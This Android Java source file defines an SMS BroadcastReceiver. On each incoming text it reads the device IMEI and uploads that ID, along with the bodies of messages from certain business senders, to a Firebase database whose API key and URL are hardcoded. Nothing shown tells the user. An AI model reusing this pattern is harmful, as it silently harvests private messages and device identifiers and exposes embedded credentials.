package nowfloats.messagelibrary;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import static android.content.Context.POWER_SERVICE;

/**
 * Created by Admin on 01-02-2017.
 */

public class SmsReceiver extends BroadcastReceiver {

    private static String DATABASE_NAME="FpId_",MOBILE_ID,MESSAGES="messages",PHONE_IDS="phoneIds",DETAILS="details";
    private String[] selection={"WAYSMS","INDMRT","JustDl","Quikrr"};

    PowerManager.WakeLock wakeLock;
    PowerManager powerManager;
    SmsMessage[] sms ;
    @Override
    public void onReceive(final Context context, final Intent intent) {
        Log.v("ggg","on receive");

        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        MOBILE_ID = tm.getDeviceId();
        //MOBILE_ID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);

        new Thread(new Runnable() {
            @Override
            public void run() {
                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                        "MyWakelockTag");
                if(!wakeLock.isHeld())
                    wakeLock.acquire();

                FirebaseOptions options = new FirebaseOptions.Builder()
                        .setApiKey("AIzaSyCZttwA-_904e5i5dt8B0ngzBdYBiZJ5Ek")
                        .setApplicationId("1:1062918210318:android:0b779b0abb2b1ef6")
                        .setDatabaseUrl("https://readmessage-37a5e.firebaseio.com")
                        .build();
                FirebaseApp secondApp = null;
                try {
                    secondApp = FirebaseApp.getInstance("second app");
                }catch(Exception e) {
                    secondApp = FirebaseApp.initializeApp(context, options, "second app");
                }
                FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
                DatabaseReference mDatabase = secondDatabase.getReference().child(DATABASE_NAME+MESSAGES).child(MOBILE_ID);

                MessageListModel.PhoneIds phoneIds=new MessageListModel.PhoneIds();
                phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
                phoneIds.setPhoneId(MOBILE_ID);
                DatabaseReference phoneIdRef =  secondDatabase.getReference().child(DATABASE_NAME+DETAILS).child(PHONE_IDS);
                phoneIdRef.child(MOBILE_ID).setValue(phoneIds);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    sms = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                }
                else
                {
                    Bundle bundle = intent.getExtras();
                    if (bundle != null) {
                        Object[] data = (Object[]) bundle.get("pdus");
                        Log.v("ggg","formate"+bundle.getString("format"));
                        if(data == null){
                            if(wakeLock.isHeld())
                                wakeLock.release();
                            return;
                        }
                        sms = new SmsMessage[1];
                        sms[0] = SmsMessage.createFromPdu((byte[]) data[0],bundle.getString("format"));
                    }
                }
                MessageListModel.SmsMessage model;
                for (SmsMessage ms:sms) {
                    for (String s:selection) {
                        if (ms.getOriginatingAddress().contains(s)){
                            model =  MessageListModel.SmsMessage.getInstance()
                                    .setBody(ms.getMessageBody())
                                    .setSubject(ms.getOriginatingAddress())
                                    .setDate(System.currentTimeMillis());
                            Log.v("ggg","\n"+ms.getOriginatingAddress()+"\n"+ms.getProtocolIdentifier()
                                    +"\n"+ms.getTimestampMillis());

                            String key = mDatabase.push().getKey();
                            mDatabase.child(key).setValue(model);
                            break;
                        }
                    }
                }
                if(wakeLock.isHeld())
                    wakeLock.release();
            }
        }).start();

    }
}
